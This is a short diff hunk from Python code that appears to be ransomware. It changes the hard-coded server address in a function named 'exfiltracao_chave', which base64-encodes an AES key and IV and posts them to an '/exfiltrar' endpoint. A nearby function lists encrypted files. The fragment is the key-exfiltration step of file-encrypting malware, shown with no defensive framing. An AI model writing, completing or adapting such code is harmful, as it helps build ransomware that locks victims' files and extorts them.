@@ -195,7 +195,7 @@ def _list_encrypted_files(limit: int = 10) -> List[str]:
     return encrypted
 
 def exfiltracao_chave(aes_key: bytes, iv: bytes) -> None:
-    endpoint = "http://10.150.3.162:8080/exfiltrar"
+    endpoint = "http://10.254.19.191:8080/exfiltrar"
     payload = {
         "aes_key_b64": base64.b64encode(aes_key).decode("utf-8"),
         "iv": base64.b64encode(iv).decode("utf-8"),
